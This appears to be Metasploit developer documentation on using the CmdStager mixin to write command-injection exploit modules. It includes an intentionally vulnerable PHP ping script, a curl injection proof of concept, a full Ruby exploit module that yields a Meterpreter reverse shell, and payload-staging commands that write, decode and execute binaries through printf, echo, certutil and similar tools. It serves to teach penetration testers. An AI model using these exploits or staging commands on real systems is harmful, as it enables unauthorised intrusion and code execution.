Command stagers provide an easy way to write exploits against typical vulnerabilities such as [command execution](https://www.owasp.org/index.php/Command_Injection) or [code injection](https://www.owasp.org/index.php/Code_Injection). There are currently 14 different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute.

# The Vulnerability Test Case

The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in example PHP code, something silly you actually might see in enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:

```php
<?php
   if ( isset($_GET["ip"]) ) {
      $output = system("ping -c 1 " . $_GET["ip"]);
      die($output);
   }
?>

<html>
<body>
  <form action = "ping.php" method = "GET">
   IP to ping: <input type = "text" name = "ip" /> <input type = "submit" />
  </form>
   </body>
</html>
```

Place the above PHP script (ping.php) on an [Ubuntu + Apache + PHP](https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04) server. Make sure your Apache server isn't exposed to the Internet!

Under normal usage, this is how the script behaves - it just pings the host you specify, and shows
you the output:

```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
```

OK, now we can abuse that a little and execute another command (id):

```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.


# The Msf::Exploit::CmdStager Mixin

Now let's talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do:

**1. Include the Msf::Exploit::CmdStager mixin**

Although there are many flavors of mixins/stagers, you only need to include [Msf::Exploit::CmdStager](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmd_stager.rb) when writing a Metasploit exploit. The mixin is basically an interface to all command stagers:

```ruby
include Msf::Exploit::CmdStager
```

**2. Declare your flavors**

To tell `Msf::Exploit::CmdStager` what flavors you want, you can add the ```CmdStagerFlavor``` info in the module's metadata. Either from the common level, or the target level. Multiple flavors are allowed.

An example of setting flavors for a specific target:

```ruby
'Targets'   =>
  [
    [ 'Windows',
      {
        'Arch' => [ ARCH_X86_64, ARCH_X86 ],
        'Platform' => 'win',
        'CmdStagerFlavor' => [ 'certutil', 'vbs' ]
      }
    ]
  ]
```

Or, you can pass this info to the `execute_cmdstager` method (see Call #execute_cmdstager to begin).

```ruby
execute_cmdstager(flavor: :vbs)
```

However, it is best to set the compatible list of flavors in `CmdStagerFlavor`, rather than hard-coding the flavor in the `execute_cmdstager` method call, as this allows the operator to choose a flavor from `msfconsole` with `set CmdStager::flavor`


**3. Create the execute_command method**

You also must create a ```def execute_command(cmd, opts = {})``` method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the ```cmd``` variable to the vulnerable code.

**4. Call #execute_cmdstager to begin**

And lastly, in your exploit method, call ```execute_cmdstager``` to begin the command stager.

Over the years, we have also learned that these options are quite handy when calling
`execute_cmdstager`:

* **flavor** - You can specify what command stager (flavor) to use from here.
* **delay** - How much time to delay between each command execution. 0.25 is default.
* **linemax** - Maximum number of characters per command. 2047 is default.

**Msf::Exploit::CmdStager Template**

At the minimum, this is how your exploit should start when you're using the CmdStager mixin:

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Command Injection Using CmdStager",
      'Description'     => %q{
        This exploits a command injection using the command stager.
      },
      'License'         => MSF_LICENSE,
      'Author'          => [ 'sinn3r' ],
      'References'      => [ [ 'URL', 'http://metasploit.com' ] ],
      'Platform'        => 'linux',
      'Targets'         => [ [ 'Linux', {} ] ],
      'Payload'         => { 'BadChars' => "\x00" },
      'CmdStagerFlavor' => [ 'printf' ],
      'Privileged'      => false,
      'DisclosureDate'  => "2016-06-10",
      'DefaultTarget'   => 0))
  end

  def execute_command(cmd, opts = {})
    # calls some method to inject cmd to the vulnerable code.
  end

  def exploit
    print_status("Exploiting...")
    execute_cmdstager
  end

end
```

As you can see, we have chosen the "printf" flavor as our command stager. We will explain more about
this later, but basically what it does is it writes our payload to `/tmp` and executes it.

Now let's modify the `execute_command` method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:

```
127.0.0.1+%26%26+[Malicious commands]
```

We do that in `execute_command` using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:

```ruby
def filter_bad_chars(cmd)
  cmd.gsub!(/chmod \+x/, 'chmod 777')
  cmd.gsub!(/;/, ' %26%26 ')
  cmd.gsub!(/ /, '+')
end

def execute_command(cmd, opts = {})
  send_request_cgi({
    'method'        => 'GET',
    'uri'           => '/ping.php',
    'encode_params' => false,
    'vars_get'      => {
      'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
    }
  })
end

def exploit
  print_status("Exploiting...")
  execute_cmdstager
end
```

And let's run that, we should have a shell:


```
msf exploit(cmdstager_demo) > run

[*] Started reverse TCP handler on 10.6.0.92:4444 
[*] Exploiting...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 10.6.0.92
[*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
```

# Flavors

Now that we know how to use the `Msf::Exploit::CmdStager` mixin, let's take a look at the command
stagers you can use.

Available flavors:

* [bourne](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/bourne.rb)
* [debug_asm](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb)
* [debug_write](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb)
* [echo](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb)
* [printf](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/printf.rb)
* [vbs](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb)
* [certutil](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/certutil.rb)
* [tftp](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/tftp.rb)
* [wget](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/wget.rb)
* [curl](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/curl.rb)
* [fetch](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/fetch.rb)
* [lwprequest](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/lwprequest.rb)
* [psh_invokewebrequest](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/psh_invokewebrequest.rb)


## VBS Command Stager - Windows Only

The [VBS command stager](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb) is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a [VBS script](https://github.com/rapid7/rex-exploitation/blob/master/data/exploits/cmdstager/vbs_b64) using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it.

If you are exploiting Windows that supports Powershell, then you might want to [consider using that instead](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit) of the VBS stager, because Powershell tends to be more stealthy.

To use the VBS stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'vbs' ]
```

Or set the :vbs key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :vbs)
```

You will also need to make sure the module's supported platforms include windows (also in the metadata), example:

```ruby
'Platform' => 'win'
```


## Certutil Command Stager - Windows Only

[Certutil](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/certutil.rb) is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8.

One thing certutil can also do for us is decode the Base64 string from a certificate, and save the decoded content to a file. The following demonstrates:

```bash
echo -----BEGIN CERTIFICATE----- > encoded.txt
echo Just Base64 encode your binary data
echo TVoAAA== >> encoded.txt
echo -----END CERTIFICATE----- >> encoded.txt
certutil -decode encoded.txt decoded.bin
```

To take advantage of that, the Certutil command stager will save the payload in Base64 as a fake certificate, ask certutil to decode it, and then finally execute it.

To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'certutil' ]
```

Or set the :certutil key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :certutil)
```

You will also need to remember to set the platform in the metadata:

```ruby
'Platform' => 'win'
```


## Debug_write Command Stager - Windows Only

The [debug_write](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb) command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute.

Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net.

To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'debug_write' ]
```

Or set the :debug_write key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :debug_write)
```

You will also need to remember to set the platform in the metadata:

```ruby
'Platform' => 'win'
```


## Debug_asm Command Stager - Windows Only

The [debug_asm](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb) command stager is another old Windows trick used to assemble a COM file, and then COM file will decode our hex-ascii payload, and then execute it.

To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'debug_asm' ]
```

Or set the :debug_asm key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :debug_asm)
```

You will also need to remember to set the platform in the metadata:

```ruby
'Platform' => 'win'
```


## TFTP Command Stager - Windows Only

The [TFTP](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/tftp.rb) command stager uses tftpd.exe to download our payload, and then use the start.exe command to execute it. This technique only works well against an older version of Windows (such as XP), because newer Windows machines no longer install tftp.exe by default.

The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root:

```
rvmsudo ./msfconsole
```

To use the TFTP stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'tftp' ]
```

Or set the :tftp key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :tftp)
```

You will also need to remember to set the platform in the metadata:

```ruby
'Platform' => 'win'
```


## PowerShell Invoke-WebRequest - Windows Only

To use the PowerShell Invoke-WebRequest stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'psh_invokewebrequest' ]
```

Or set the :psh_invokewebrequest key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :psh_invokewebrequest )
```

## Bourne Command Stager - Multi Platform

**Linemax** minimum: 373

The [Bourne](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/bourne.rb) command stager supports multiple platforms except for Windows (because the use of the which command that Windows does not have). It functions rather similar to the VBS stager, except when it decodes the Base64 payload at runtime, there are multiple commands to choose from: base64, openssl, python, or perl.

To use the Bourne stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'bourne' ]
```

Or set the :bourne key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :bourne)
```


## Echo Command Stager - Multi Platform

**Linemax** minimum: 26

The [echo](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb) command stager is suitable for multiple platforms except for Windows. It just [echos](http://manpages.ubuntu.com/manpages/trusty/man1/echo.1fun.html) the payload, chmod and execute it. An example of that looks similar to this:

```
echo -en \\x41\\x41\\x41\\x41 >> /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
```

To use the echo stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'echo' ]
```

Or set the :echo key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :echo)
```


## Printf Command Stager - Multi Platform

**Linemax** minimum: 25

The [printf](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/printf.rb) command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this:

```
printf '\177\177\177\177' >> /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
```

To use the printf stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'printf' ]
```

Or set the :printf key to `execute_cmdstager`:

```ruby
execute_cmdstager(flavor: :printf)
```

## cURL Command Stager - Multi Platform

To use the cURL stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'curl' ]
```

Or set the :curl key to `execute_cmdstager`:

```ruby
execute_cmdstager(flavor: :curl)
```


## wget Command Stager - Multi Platform

To use the wget stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'wget' ]
```

Or set the :wget key to `execute_cmdstager`:

```ruby
execute_cmdstager(flavor: :wget)
```


## LWP Request Command Stager - Multi Platform

To use the lwprequest stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'lwprequest' ]
```

Or set the :lwprequest key to `execute_cmdstager`:

```ruby
execute_cmdstager(flavor: :lwprequest)
```


## Fetch Command Stager - BSD Only

To use the fetch stager, either specify your CmdStagerFlavor in the metadata:

```ruby
'CmdStagerFlavor' => [ 'fetch' ]
```

Or set the :fetch key to `execute_cmdstager`:

```ruby
execute_cmdstager(flavor: :fetch)
```
